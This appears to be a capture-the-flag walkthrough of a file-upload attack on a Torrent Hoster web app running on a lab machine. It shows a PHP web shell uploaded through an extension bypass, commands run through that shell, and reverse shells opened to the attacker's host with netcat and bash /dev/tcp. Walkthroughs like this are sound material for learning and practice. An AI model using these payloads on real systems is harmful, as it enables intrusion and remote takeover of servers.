# Torrent Hoster - Remount Upload

## Scanning

Torrent Hoster hosted at `http://10.10.10.6/torrent/`.

First step, at `http://10.10.10.6/torrent/users/index.php?mode=register`, sign up an account `user:user` and login.

![](images/2.png)

Next step, download a torrent file, example `kali-linux-2021.1-installer-amd64.iso.torrent` and upload it to Torrent Hoster at `http://10.10.10.6/torrent/torrents.php?mode=upload`

```
wget https://images.kali.org/kali-linux-2021.1-installer-amd64.iso.torrent
```

![](images/3.png)

Click `Edit this torrent` and view another page to update the torrent. In there, upload an image to `Update Screenshot`.

![](images/4.png)

File successfully uploaded

![](images/5.png)

## File Upload Bypass

At `upload screenshot file`, let's intercept the request with Burp Suite.

Change the content in the image to `<?php system($_GET['cmd']); ?>` and change the file name extension to `bymeacoffee.jpg.php`

![](images/6.png)

Back to torrent file in the server and get the location of the backdoor.

![](images/7.png)

Follow the url and access to the upload folder at `http://10.10.10.6/torrent/upload/`

![](images/8.png)

## Gain Reverse Shell

Execute the backdoor with `id` command.

```
┌──(Hades㉿10.10.14.5)-[7.1:42.6]~/walkthrough/hackthebox/popcorn
└─$ curl 'http://10.10.10.6/torrent/upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Url encode payload with `hURL`

```
┌──(Hades㉿10.10.14.5)-[6.8:42.7]~
└─$ hURL -U 'nc -nv 10.10.14.5 443 -e /bin/sh'

Original    :: nc -nv 10.10.14.5 443 -e /bin/sh
URL ENcoded :: nc%20-nv%2010.10.14.5%20443%20-e%20%2Fbin%2Fsh
```

Execute payload

```
curl 'http://10.10.10.6/torrent/upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php?cmd=nc%20-nv%2010.10.14.5%20443%20-e%20%2Fbin%2Fsh'
```

```
curl -G 'http://10.10.10.6/torrent/upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'"
```

![](images/9.png)

## Reference

[https://www.exploit-db.com/exploits/11746](https://www.exploit-db.com/exploits/11746)

[https://infinitelogins.com/2020/08/07/file-upload-bypass-techniques](https://infinitelogins.com/2020/08/07/file-upload-bypass-techniques)

[https://github.com/leecybersec/walkthrough/tree/master/hackthebox/popcorn](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/popcorn)